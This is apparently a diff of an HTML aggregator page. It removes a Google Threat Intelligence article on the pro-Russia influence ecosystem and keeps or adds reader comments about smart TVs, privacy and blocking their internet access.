 I just skip that by using pc monitors with an hdmi audio splitter
+I do wonder if that might be dangerous? 193 is public ip address space. Use a fake gateway ip and dns server instead.
 The alternative to all these ‘smart tv’s’ I like is to use an hdmi PC monitor with an hdmi audio splitter, lots of really nice monitors out there without the bloatware I could do without
 This is why there is a market for devices such as the Apple TV.
 A newbie here….I recently bought an LG smart TV at Costco and then installed the Spectrum TV app (I have their cable because of my live news addiction..lol). Does this mean that I have somehow enabled internet access without realizing it?
 Spectrum is owned by Charter Comm. I don’t think they’ve been accused of this but I could be mistaken.
-They’ve been accused of other things probably comparable on some level… but not this AFAIK.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
-            <h2 class="article-title">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-influence-ecosystem/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem
-Google Threat Intelligence Group
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: James Sadowski, Alden Wahlstrom
-Introduction
-Four years into Russia’s full-scale invasion of Ukraine, the pro-Russia influence ecosystem has evolved from a tool of war back into a global strategic asset. Since the mobilization of this ecosystem to support frontline objectives, we have witnessed the expedited development of new influence assets linked to multiple, expansive, covert information operations (IO) campaigns and a [revitalization](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) of pro-Russia hacktivism at an unprecedented scale. While this threat activity initially adapted to encompass Ukraine-related priorities, it is gradually pivoting back to established Russian influence objectives for which the ecosystem was originally honed. This shift is significant because it likely signals increased focus outside of Ukraine, warning that pro-Russia influence activity targeting the European Union (EU), North Atlantic Treaty Organization (NATO), and other top targeting priorities may intensify.
-Ultimately, the war in Ukraine has provided a critical feedback loop for Russia to refine its influence activity, lessons that we anticipate will be applied as the ecosystem continues to reorient toward global strategic objectives while maintaining focus on Ukraine. Further, recent pro-Russia IO indicates the continued expansion of already diverse tactics, and the increasing use of [generative AI tooling](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai) for planning, research, and content creation marks a forward trend in pro-Russia IO. Meanwhile, new and different actors have adopted IO tactics to meet an increasingly diverse set of challenges, signaling growing Russian reliance on influence tactics. Together, these trends likely demonstrate the Kremlin's perception of these tactics as cost effective and successful. The interconnected nature of the ecosystem's disparate components makes it resilient to limited scope disruptions, which defenders must consider to effectively mitigate pro-Russia influence threats.
-The Ecosystem at a Glance: Objectives, Targeting, and Tactics
-Russia's modern approach to information operations is built on the conceptual foundation of Soviet-era "[active measures](https://www.marshallcenter.org/en/publications/security-insights/active-measures-russias-covert-geopolitical-operations-0)" adapted for the digital age. Alongside disruptive cyberattacks dating back to the early 2000s, the Kremlin has increasingly harnessed internet-based platforms for espionage and information operations. Russia's approach has evolved from rudimentary, singular operations into a complex, self-sustaining environment intentionally curated by the Russian Government that blends overt, covert, and independent elements to advance Kremlin interests both at home and abroad.
-Core Influence Objectives
-GTIG’s observations suggest the primary strategic motivations driving the pro-Russia influence ecosystem fall into five categories, each aiming to achieve military and/or political objectives through psychological manipulation of the target audience (Figure 1). Collectively, these objectives informally depict a global influence strategy: through the furthest reach of its influence, the Kremlin seeks to diminish Western primacy and advance Russia's global position; within its surrounding region, it strives to retain and return Moscow's dominance; and at home, it works to ensure the stability of the political regime.
-Figure 1: Core objectives of the pro-Russia influence ecosystem
-Targeting
-Pro-Russia influence operations are pivoting from the [near singular focus on Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) that dominated the ecosystem since 2022. We expect influence operations advancing Russia's war-specific interests to continue. However, as Russia seeks to reemerge from international isolation, we have increasingly observed a concurrent focus on pre-war pro-Russia influence objectives.
-The current and historical targeting scope of each ecosystem component exposes both the Kremlin's global ambitions and the realistic limitations of its power projection. State-owned media organizations produce content intended to serve populations across six continents, but in recent years, sanctions and other factors have limited its production and distribution. Meanwhile, covert operations have appeared more limited in scope, primarily targeting the West and countries surrounding Russia, with intermittent operations targeting the Middle East and Africa, indicating that finite resources necessarily limit these operations (Figure 2).
-Top Regional Targets
--
-The United States and Europe: The Kremlin has long viewed the West as a top adversary of Russia. Accordingly, the US and Europe are top targets of covert pro-Russia information operations, especially aimed at undermining political stability within these countries and the unity between them. NATO and the EU embody the collective "West" and are Russia's perceived top adversaries, second only to the US independently.
--
-Russia's "Near Abroad": Since the dissolution of the Soviet Union, Moscow has asserted that the countries that formerly comprised part of the USSR now reside in Russia's so-called "sphere of influence." Covert influence targeting this region directly reflects Moscow's assertion that Russia is a world power entitled to special privileges within its neighborhood.
--
-The Middle East and Africa: Over the past decade, Russian efforts to reassert itself as a global power have included high-profile investments in cultivating Russia's standing in the Middle East and
-[Africa](https://cloud.google.com/blog/topics/threat-intelligence/io-campaigns-russian-prigozhin-persist). Covert pro-Russia influence activity is likely deployed in tandem as intended support for other Russian initiatives in these regions. -
-Russia Domestic: Internally targeted covert IO is a well-established component of pro-Russia influence activity, deployed by regime-aligned actors to promote Kremlin policies and repress opposition voices.
-Targeted Entities and Global Events
--
-The Olympics: Russia has long viewed Olympic participation as a point of national prestige, and GTIG has observed notable Russian influence activity targeting the
-[Olympics](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-2024-paris-olympics)in the face of Russian participation bans. -
-War in Ukraine: The
-[war in Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)has been a key driver of Russia's influence activity, including attempts to influence events on the ground as well as influence activity intended to advance Moscow's interests elsewhere vis-a-vis the war. GTIG expects that Ukraine will remain a priority in Russia's targeting calculus during the post-conflict phase following any future peace agreements. -
-Elections: Election targeting aligns with multiple Russian influence objectives, including attempting to undermine confidence in democratic institutions as well as internally weakening perceived Western adversaries. These operations regularly target elections in countries that are already prioritized by ongoing pro-Russia influence activity.
--
-Ad Hoc Geopolitical Flashpoints and Global Events: Russian influence actors have a history of pivoting activity to engage with emerging geopolitical developments and events, such as the
-[COVID-19](https://cloud.google.com/blog/topics/threat-intelligence/limited-shifts-cyber-threat-landscape-driven-covid-19?e=48754805)pandemic or the[2026 Middle East](https://apnews.com/article/iran-war-images-misinformation-russia-israel-9e495017dc5c4bf24a0b6152863dbfb1)conflict. This flexible target selection often overlaps or is aligned with other Russian priorities, making previously observed Russian influence activity helpful in anticipating which events may be appropriated.
-Figure 2: Priority targets of the ecosystem
-Tactics
-Converging geopolitical and technological developments make the evolution of pro-Russia influence tactics a particularly important space to monitor right now. The pro-Russia influence ecosystem expanded to support the war effort, bringing change across the spectrum of activity and providing operators the opportunity to hone their tactics, techniques, and procedures (TTPs) in the rapid feedback loop of war. Meanwhile, the emergence and increased democratization of [generative AI](https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use) tooling has brought both promised and already realized opportunities to support all phases of the IO lifecycle. The following are a sample of key tactics that illustrate how pro-Russia actors currently blend well-tested methods with new technological developments to reach audiences through diverse means:
--
-Generative AI: GTIG
-[has observed](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai)pro-Russia influence actors increasingly leverage AI tooling to support different stages of their operations, including support for planning and general research as well as content creation. -
-Google Threat Intelligence Group (GTIG) is closely tracking the transition from nascent AI-enabled operations to the maturing, industrial-scale application of generative models within adversarial workflows across threats ranging from espionage and crime to IO. Please see our latest
-[AI threat tracker](https://cloud.google.com/blog/topics/threat-intelligence/ai-vulnerability-exploitation-initial-access)for more information on how this threat is developing based on our insights, and what Google is doing to protect our customers. -
-Narrative Resonance: Hijacking existing ideological and emotional fissures within a society provides pro-Russia influence actors tailored narratives to target audiences and potentially increases potential engagement and impact.
--
-Cyber-Enabled IO: Influence campaigns frequently coincide with destructive cyberattacks, such as the deployment of
-[wiper malware](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook?e=48754805)alongside website defacements containing false surrender messages, or the historic use of "hack and leak" campaigns in which exfiltrated data, sometimes manipulated, is then publicized through an actor-controlled false persona. In some instances, Russian actors may even leverage direct cyber espionage targeting as a way to achieve psychological effects, intending to influence victims' behavior through intimidation. -
-Media Mimicry: Pro-Russia actors have attempted to mimic legitimate media at scale and through a variety of means, including via the wholesale appropriation of legitimate media brands or developing inauthentic media brands that generally masquerade as independent news sources. These tactics are intended to add a veneer of legitimacy to the promoted narratives.
--
-Direct Dissemination: Pro-Russia influence actors have used closed communication channels, such as emails, SMS text messages, and messenger apps, to disseminate various types of pro-Russia narratives as an adjunct to or outside typical social media-focused operations.
-Core Ecosystem Components
-The current pro-Russia influence ecosystem operates across a spectrum from official government communications to deniable covert actions conducted by intelligence services and "patriotic" proxies. GTIG identified six core components that represent key activity types (Figure 3). While many elements are state-directed or state-affiliated, the ecosystem is also a cultivated, self-sustaining system: various actors, often without explicit direction, amplify Kremlin-friendly narratives and pursue actions that advance Russia's strategic interests. This fluidity provides resilience and complicates attribution, mirroring the longstanding Kremlin strategy to co-opt non-state actors, including criminal networks for [finance](https://www.rusi.org/explore-our-research/publications/commentary/operation-destabilise-russia-organised-crime-and-illicit-finance) or [illicit logistics](https://www.bbc.com/news/articles/cz91dk0l50no), to achieve state objectives without direct attribution. Although each of the core ecosystem components serves as a unique lever the Russian Government can employ to achieve desired objectives, they are regularly used together. For instance, while the entire pro-Russia hacktivist landscape is not state-sponsored, the Russian intelligence services have used both genuine and fabricated hacktivist personas to launder stolen data as part of blended cyber espionage and IO hybrid operations.
-Figure 3: Core components of the pro-Russia influence ecosystem
-An Interconnected Ecosystem Enhances Influence Utility
-Figure 4 illustrates the complex, interconnected nature of the pro-Russia influence ecosystem by mapping relationships between a selection of key actors and organizations across five of the core components. The ecosystem functions as a cohesive unit, not only through shared objectives, but also through direct cross-component interactions. The Russian Government functions as the sixth core ecosystem component, setting the policy and talking points that inform the ecosystem’s promoted narratives and sponsoring overt and covert assets throughout the other five components diagrammed in Figure 4. Through these levers, the Kremlin fosters the cross-component links that underpin the ecosystem, enhancing its overall utility as a versatile tool of state influence.
-Figure 4: Subset of actors that illustrate how different components of the ecosystem interact with each other
-10 Key Dynamics for Understanding the Pro-Russia Influence Ecosystem
-The scope and diversity of activity in the pro-Russia influence ecosystem challenges defenders tasked with enumerating, tracking, and countering its threats. GTIG has distilled 10 key ecosystem dynamics based on our current understanding of its components and how they each enable covert influence activity. These dynamics frame critical aspects of how activity manifests within the ecosystem, providing a high-level guide to understand and track these threats.
-Large-scale IO campaigns are an integral element of the pro-Russia influence ecosystem. Major pro-Russia IO campaigns have been an enduring feature of the pro-Russia ecosystem, with new campaigns emerging as previous ones fall into inactivity. Maintaining extensive IO campaigns and their associated established influence infrastructure enables proactive [messaging](https://home.treasury.gov/news/press-releases/jy0628) on strategic issues and underpins a capability that can be rapidly adapted for emerging domestic and global priorities.
--
-Long-established IO campaigns, like Secondary Infektion,
-[pivoted to meet](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)new strategic needs as Russia’s 2022 invasion of Ukraine began. New IO campaigns, such as “Operation Overload,” subsequently emerged to support the war effort; while Secondary Infektion has become dormant, these “successor” campaigns have since been leveraged to advance other global Russian influence objectives beyond the war itself.
-Pro-Russia actors often prioritize persistence and the range of tactics they leverage reflects this. In the face of public exposure and disruption, pro-Russia actors and their infrastructure have often remained persistent, sometimes making tactical adjustments to mitigate the effects of detection and disruption and other times continuing operations unabated.
--
-These persistence tactics include the Doppelganger campaign and overt
-[Russian media](https://www.bloomberg.com/news/articles/2023-11-23/ukraine-war-how-kremlin-propaganda-websites-dodge-disinformation-sanctions#xj4y7vzkg)’s respective cycling of domain infrastructure and/or use of mirror domains to overcome exposure, platform bans and sanctions. Influence operators also frequently continue using compromised assets, sometimes mocking their exposure, as seen with the legacy US-targeted NAEBC campaign and the APT44-affiliated hacktivist persona XakNet Team.
-Figure 5: NAEBC-linked persona account mocking public exposure of influence assets (left), and GRU-sponsored XakNet Team persona mocking then-Mandiant (now part of Google Threat Intelligence Group) attribution of the group’s activities to the GRU (right)
-Pro-Russia and Russian cyber espionage groups leverage IO tactics to support their operations and weaponize stolen data and/or illicit access. While less frequent, this [hybrid activity](https://cloud.google.com/blog/topics/threat-intelligence/russian-espionage-influence-ukrainian-military-recruits-anti-mobilization-narratives) is a critical dynamic within the pro-Russia influence ecosystem. GTIG has previously observed operations used to shape narratives around [cyberattacks](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook) and influence events on the ground and to conduct foreign political interference, including the repeated targeting of [foreign elections](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-global-elections), reported in Spring 2024. We have attributed some observed instances of this to Russian government-sponsored threat actors.
--
-Russian state sponsored or pro-Russia hacktivist groups have long relied on public advertisement of real or claimed data exfiltration to highlight their operations, intimidate targets, or sway public opinion. In 2022, UNC4057 (COLDRIVER) used data stolen from espionage targets in a high profile hack-and-leak operation seeking to exacerbate divisions in UK politics. More recently, the self-proclaimed hacktivist group
-[PalachPro](https://cert.gov.ua/article/6287707)claimed in February 2026 to have gained unauthorized access to a Ukrainian government online portal and publicly posted[screenshots](https://caspianpost.com/regions/russian-hackers-target-ukraine-s-starlink-authorisation-service)of the claimed compromise. The Ukrainian government has previously noted that the portal does not store the type of data the threat actor claimed to compromise, suggesting the public posting was likely intended as influence activity, attempting to create the illusion of a more serious threat.
-Figure 6: UNC4057 leak website attempting to inflame public debate
-Pro-Russia hacktivists serve a direct influence function. Modern pro-Russia hacktivism has evolved into an important component of the influence [ecosystem](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) that blends [state-backed actors](https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm) leveraging [hacktivist tactics](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) with an evolving cohort of likely third-party hacktivist actors that support Russia's geopolitical interests. Pro-Russia hacktivist groups gain domestic and foreign attention for strategic messaging via their [claimed threat activity](https://cloud.google.com/blog/topics/threat-intelligence/killnet-new-capabilities-older-tactics), amplify narratives directly seeded in overt ecosystem segments, and at times also support traditional IO activity or create a means of plausible deniability for state-sponsored espionage actors.
--
-The self-proclaimed hacktivist group NoName057(16) emerged following the Russian invasion of Ukraine in 2022, primarily targeting Ukraine and its partners and allies with DDoS attacks and various network intrusions. It has targeted high profile events, such as the Milano Cortina Winter Olympics, institutions like the French National Assembly, and critical infrastructure and transportation targets in Germany. Often their messaging cites grievances with overt acts of Western support for Kyiv, suggesting the group advances Russian interests not only through the targeting of perceived Russian adversaries but also in gaining attention for its pro-Russia messaging.
-Established ecosystem components facilitate the cultivation of new assets and activity. Inter-ecosystem cross-promotion helps overcome challenges of audience building by directing traffic toward [new assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-2022-midterm-elections/), operations, and narratives, enabling rapid deployment of new and existing IO capabilities. This directly supports a self-sustaining cycle that maintains and expands the ecosystem.
--
-The hacktivist persona JokerDNR played a significant role in amplifying the APT44-linked persona Solntsepek when its doxxing-focused Telegram channel first launched and then again as it began claiming cyber espionage activity.
-Domestic Russian audiences are a longstanding target of the pro-Russia influence ecosystem. Internally directed [influence activity](https://blog.google/threat-analysis-group/prigozhin-interests-and-russian-information-operations/) has often involved the promotion of Kremlin policies and talking points and the denigration of opposition voices and ideas, conducted by both overt and covert segments of the ecosystem.
--
-Ahead of Russia’s March 2024 presidential election, GTIG identified the hybrid espionage and influence actor UNC5101 register domains and conduct associated influence operations attempting to deceive Russian opposition voters about the timing of an anti-Putin protest.
-Ecosystem actors respond to the same set of internal shifting circumstances and external geopolitical developments, often leading to seemingly similar, but ultimately distinct, activity. These shared drivers and general motivational alignments encourage actors to "spontaneously" coalesce around a particular topic or narrative. While this can appear superficially similar, this phenomenon is distinct from instances of actor coordination and campaign linkages, which is less common.
-Systemic flexibility is a central feature, with influence assets able to mobilize both incrementally and at scale to advance Russian interests. The Russian Government is able to [mobilize assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) across the ecosystem to respond to strategic events. Meanwhile, individual or aligned actors can separately mobilize to address [tactical needs](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions), allowing the ecosystem to concurrently message on multiple issues across different geographies (Figure 7).
--
-Russia demonstrated its ability to focus the ecosystem on a single strategic issue like the Russian invasion of Ukraine. Simultaneously, discrete assets have addressed tactical events, such as when Portal Kombat briefly
-[promoted](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions)narratives about a Russian drone incursion into Poland concurrently with other covert pro-Russia influence activity.
-Figure 7: Tactical responses are executed by individual or coordinated/aligned clusters of actors to address emerging developments
-Overt Russian media contributes to, and is connected with, multiple covert influence components. The overt components of Russia's influence infrastructure play a critical role within the broader Russian influence ecosystem beyond the commonly understood function of providing a public platform for government-aligned narratives and official talking points; overt media helps to drive (inform targeting) and amplify covert pro-Russia influence activity, seeding desirable narratives within the ecosystem and providing an indirect conduit between the Kremlin and a disparate array of influence actors. Overt media outlets have directly [coordinated](https://home.treasury.gov/news/press-releases/jy2559) their activity with covert actors and have increasingly employed IO tactics to disseminate their own content in the face of sanctions and platform bans (Figure 8).
--
-US Government
-[sanctions](https://home.treasury.gov/news/press-releases/jy2559)in late 2024 indicated that Russian state media company Russia Today (RT) directly conducted covert influence operations, including on behalf of the Russian intelligence services. Further, RT employees reportedly interacted with members of the self-proclaimed hacktivist group RaHDit, which has claimed to collaborate with multiple other pro-Russia hacktivist groups, illustrating the layered connections between overt media, Russian intelligence services, and hacktivist groups.
-Figure 8: Overt Russian media maintains multiple links with the covert segments of the ecosystem
-Outsourcing IO capability development and campaign execution to third-party organizations and proxies enables scaling and obfuscation. Outsourcing is used for developing [custom tooling](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan) and bolstering both human and [organizational](https://home.treasury.gov/news/press-releases/jy2559) [capacity](https://home.treasury.gov/news/press-releases/jy2195). While [custom tool](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) development facilitates operators in all phases of the IO lifecycle, Russian government actors can flexibly leverage different models for outsourcing campaign execution based on their specific needs. Proxy actors can also generate plausible deniability (Figure 9).
--
-GTIG
-[reported](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan)how Russian IT contractor NTC Vulkan (Russian: НТЦ Вулкан) worked with the Russian intelligence services, including providing tooling and support for the GRU unit that sponsors APT44 activity. Separately, US government[sanctions](https://home.treasury.gov/news/press-releases/jy2195)detailed how the Doppelganger campaign is supported by multiple Russian contractors under the sponsorship of the Russian Presidential Administration.
-Figure 9: Outsourcing and proxies support capability development and campaign execution for covert influence activity
-Conclusion
-Multiple factors are propelling the evolution of the pro-Russia influence ecosystem we have observed since Moscow’s full scale invasion of Ukraine four years ago. The Kremlin mobilized the entire ecosystem to support the ongoing conflict, which has provided rapid feedback and driven significant investment in new and established overt and covert influence assets. At the same time, pro-Russia actors are increasingly experimenting with generative AI to enhance their workflows. This condensed period of adaptation, alongside signals suggesting Russia's growing reliance on IO tactics to navigate new challenges, raises concerns regarding how a potentially diversifying pool of actors will leverage advancements in tradecraft and scalability. As Russia seeks to emerge from international isolation and reorients its influence ecosystem back toward global objectives, it is critical for defenders to understand how this ecosystem provides the Kremlin with a durable influence capability in order to better anticipate future Russian influence threats.
-Additional Tools and Resources
-For mitigation and hardening recommendations, please review the following:
--
-[How to Understand and Action Mandiant's Intelligence on Information Operations](https://cloud.google.com/blog/topics/threat-intelligence/understand-action-intelligence-information-operations) -
-[Proactive Preparation and Hardening to Protect Against Destructive Attacks](https://cloud.google.com/blog/topics/threat-intelligence/preparation-hardening-destructive-attacks) -
-[Linux Endpoint Hardening to Protect Against Malware and Destructive Attacks](https://services.google.com/fh/files/misc/linux-endpoint-hardening-wp-en.pdf) -
-[Distributed Denial of Service (DDoS) Protection Recommendations](https://services.google.com/fh/files/misc/ddos-protection-recommendations-wp-en.pdf)
-Google offers a suite of free of cost tools to help protect high-risk users from the most pervasive digital attacks, to which politicians, journalists, and campaigns are often most vulnerable. Examples include protecting accounts from targeted attacks with [Advanced Protection Program](https://landing.google.com/advancedprotection/) and safeguarding campaign websites from DDoS attacks with [Project Shield](https://projectshield.withgoogle.com/landing).</div>
+They’ve been accused of other things probably comparable on some level… but not this AFAIK.
+Any journalist who ever hears the boast “we had an independent audit by PwC” needs to follow up with “and why aren’t you sharing the result”?
+Otherwise you are just laundering some weird ass notion of respectability – they had enough dodgy money to get an audit, from an auditor who of course writes audits for pay, that being their job
+SmartTV’s suck.
+Period.
+We are not probably there yet but if more people won’t connect TVs to the internet, TVs will create a mesh network itself and connect to the internet via a closest neighbor which has his TV connected to the imternet. 🙂
+https://arstechnica.com/gadgets/2026/07/microsoft-responds-to-lg-monitors-installing-mcafee-ads-on-windows/?comments-page=1#comments
+LG already does this on their TVs (not just monitors):
+1) record your screen and upload it to their servers
+2) listen to your conversations
+3) share your data with third parties
+Bit of a two faced approach going on here..</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
